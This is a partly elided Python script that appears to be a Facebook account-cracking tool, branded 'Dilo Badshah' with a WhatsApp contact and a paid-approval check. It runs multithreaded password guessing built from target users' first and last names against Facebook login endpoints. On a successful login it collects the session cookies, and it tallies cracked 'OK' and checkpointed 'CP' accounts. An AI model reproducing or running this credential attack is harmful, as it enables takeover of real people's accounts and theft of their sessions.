...
#!/usr/bin/python
#Original written By Dilo Badshah 
...
from concurrent.futures import ThreadPoolExecutor as sarfrazDilo
from string import * 
...
logo =                                          """            
\033[1;92m   8888888b.  d8b 888   
\033[1;92m   888  "Y88b Y8P 888
\033[1;92m   888    888     888
\033[1;92m   888    888 888 888  .d88b.  
\033[1;92m   888    888 888 888 d88""88b 
\033[1;92m   888    888 888 888 888  888\033[1;37m BADSHAH X MISHAL QUEEN 
\033[1;92m   888  .d88P 888 888 Y88..88P
\033[1;92m   8888888P"  888 888  "Y88P" 
\033[1;92m------------------------------------------------
\033[1;92m Owner   : DILO BADSHAH
\033[1;92m WHATSAPP: +923154619676
\033[1;92m STATUS : FREE APPROVAL 
...
def Dilo():   
    ...
    print(f'[2] Public ID Crack No Work')
    ...
    print(f'[F] admin Facebook account ')
    print('')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {N}[Dilo] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {N}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Dilo = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Dilob};{ckkk}"
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {N}[Dilo] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {N}[Dilo] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {N}{'{:.0%}'.format(loop/float(len(self.id)))}{N}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazDilo(max_workers=30) as Diloworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    print(47*'-')
    input(f"{N} Press Enter To Back Dilo Menu ")
    Dilo(allkey)       
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Diloking/BADSHAH-/blob/main/PAID.TXT').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923154619676?text='+tks),approval()
      time.sleep(1)
      Dilo()
  except:
    sys.exit()
